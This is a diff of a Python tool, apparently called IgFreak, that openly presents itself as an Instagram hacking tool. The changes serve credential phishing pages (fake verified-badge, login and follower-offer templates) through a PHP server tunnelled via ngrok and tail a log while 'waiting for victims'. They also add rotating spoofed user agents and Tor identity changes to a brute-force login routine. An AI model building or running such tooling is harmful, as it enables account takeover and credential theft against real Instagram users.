@@ -1,3 +1,4 @@
+
 #!/usr/bin/python3
 # -*- coding: UTF-8 -*-
 #
@@ -60,6 +61,19 @@ M = Style.BRIGHT+Fore.MAGENTA
 W = Style.BRIGHT+Fore.WHITE
 R = Style.BRIGHT+Fore.RED
 version = 1.0
+def check_d():
+
+    php = os.system("command -v  php > /dev/null")
+    if php == 0:
+        pass
+    else:
+        print(f"{R}[!] php - 404 NOT FOUND !")
+        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
+        if php_install.lower() == "y":
+            os.system("apt-get update")
+            os.system("apt-get install php")
+            return check_d()
+check_d()
 code = """
 torser="tor"
 if pgrep -x "$torser" > /dev/null
@@ -174,16 +188,7 @@ import sys
 import pip
 pipv = pip.__version__
 version = 3.0
-def startServicea(folder):
-	os.chdir(folder)
-	import http.server , ssl
-	server_adress = ("localhost",9876)
-	httpd + http.server.HTTPServer(server_adress.SimpleHTTPRequestHandler)
-	httpd.socket = ssl.wrap_socket(httpd.socket,
-	server_side=True,
-	certfile='localhost.pem',
-	ssl_version=ss.PROTOCOL_TLS)
-	httpd.server_forever()
+
 	
 	
 import argparse 
@@ -213,12 +218,12 @@ cli_parser.add_argument('--verbose',  # check if the user wants verbose mode ena
                         help='Activate Verbose mode. ( Verbose level )'
                         )
                         
-cli_parser.add_argument('-bruteforce',  # parse path to password list file
+cli_parser.add_argument('--bruteforce',  # parse path to password list file
                         '-b',
                         action='store_true',
                         help='password list file to try with the given username.'
                         )
-cli_parser.add_argument('-phish_account',  # parse path to password list file
+cli_parser.add_argument('--phish',  # parse path to password list file
                         '-p',
                         action='store_true',
                         help='Phish any instagram account'
@@ -229,48 +234,56 @@ cli_parser.add_argument('--help',  # parse path to password list file
                         
                         help=help
                         )
+pwd = os.getcwd()
 
 def phish(template):
 	printInfo("Phisher ")
+	os.system('pkill php')
 	print()
+	import random
+	port = random.randint(1111,9999)
 	print(f"""
 
 	{C} Template : {G} {template}
 	{C} Server   : {G} Ngrok
-    {C} Port     : {G} 6666
+        {C} Port     : {G} {port}
 	
-	{B} STARTING SERVERS """)
-	link = startServicea(template+"/")
+	{B} STARTING SERVERS
+{G}{"="*25}{Y}LOGS{G}{"="*25}{R} """)
+	link = startServicea(template+"/",port)
+	print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}\n ')
 	print(f"{G} LINK = {Y} {link}")
 	print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
 	print()
-	print(f"{B}[{G}>{B}]{W} Wating for victims ...")
-	def check():
-		if os.path.exists("log.txt"):
-			os.system('cat log.txt && rm log.txt')
-			return check()
-		else:
-			return check ()
+	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
+	def check_ok():
+		os.system('echo -n "" > ip.txt')
+		try:
+			os.system("tail -f ip.txt	")
+		except KeyboardInterrupt:
+			print(f"\n\n{Y} Exiting ")
+			os.system('pkill ngrok ')
+			exit(0)			
+	check_ok()
+	exit()
 
-def startServicea(folder):
+def startServicea(folder,port):
 	import os
 	os.chdir(folder)
-	import http.server , ssl
-	server_adress = ("localhost",6666)
-	httpd = http.server.HTTPServer(server_adress,http.server.SimpleHTTPRequestHandler)
-	httpd.socket = ssl.wrap_socket(httpd.socket,
+	
 
-
-	ssl_version=ssl.PROTOCOL_TLS)
-	import _thread
-	def main():
-		httpd.serve_forever()
-	_thread.start_new_thread(main,())
-	link =  ngrok.connect(6666,"http")
-	link = str(link)
+	code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
+	fileok = os.system(code)
+	import time
+	time.sleep(3)
+	link =  ngrok.connect(port,'http')
+	ngrok.get_ngrok_process().stop_monitor_thread()
+	link = str(link).replace('NgrokTunnel: "','')
+	link = link[:-28]
+	return link
 
 def printInfo(str):
-	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram brute force command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
+	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
 	os.system(f"dat=$(date) && echo {G}[{W}✓{G}] {C}Started {str} on {G}$dat")
 def error(str):
 	print()
@@ -319,15 +332,33 @@ def ExecuteIgFreak():
     elif Parsed.help == False:
     	pass
 
-    if Parsed.phish_account == True:
+    if Parsed.phish == True:
     	if Parsed.template  is not None:
+    		if Parsed.template == "instafollowers" or Parsed.template == "instagram" or Parsed.template == "igbadges":
+    			phish(Parsed.template)
+    		else:
+    			error(f"Template {R+Parsed.template+Y} not found")
+    			print()
+    			print(f"{W} Available Templates")
+    			print(f"""
+{G}Template      Description{W}
+    			
+{B}igbadges       : {W}Hack account by confirming account in get verified badges
+{B}instagram      : {W}Instagram simple login page 
+{B}instafollowers : {W}Get Instagram accounts by seeking followers""")
+    			exit(1)
     		print()
-    		phish(Parsed.template)
-    		exit()
+    		try:
+    			phish(Parsed.template)
+    		except exception:
+    			print(f"\n\n{Y} Exiting ")
+    			pass   			
+    		exit(0)
     	elif Parsed.template is None:
-    		print(logo)
+    		print()
     		error("Please Provide a template")
     		exit()
+    	
     else:
     	print()
     	pass
@@ -358,9 +389,18 @@ def signin(password,username):
          usa2 = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36'
          usa3 = 'Mozilla/5.0 (Linux; Android 9; SM-J701F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 GSA/12.22.8.23.arm'
          us4 = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36'
-         us5 = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5'
+         us5 = 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us6 = 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us7 = 'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us8 = 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us9 = 'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us10 = 'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us11 = 'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us12  = 'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
+         us13 = 'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0'
+         us14 = 'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:94.0) Gecko/94.0 Firefox/94.0'
          user = ua.random
-         usa = (usa1,usa2,usa3,us4,us5)
+         usa = (usa1,usa2,usa3,us4,us5,us6,us7,us8,us9,us10,us11,us12,us14)
          usa = random.choice(list(usa))
          s = rs.Session()
 		  
@@ -376,7 +416,7 @@ def signin(password,username):
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    f'user-agent': user,
+    f'user-agent': usa,
     'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
     'x-ig-app-id': '936619743392459',
     'x-ig-www-claim': '0',
@@ -393,7 +433,7 @@ def signin(password,username):
          ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
          por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
 
-         print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
+         print(f"{B}[{G}>{B}]{W} Using Agent : {G}{usa}")
          renew_connection()
          s = get_tor_session()
          ipc = requests.get("https://httpbin.org/ip").json()['origin']
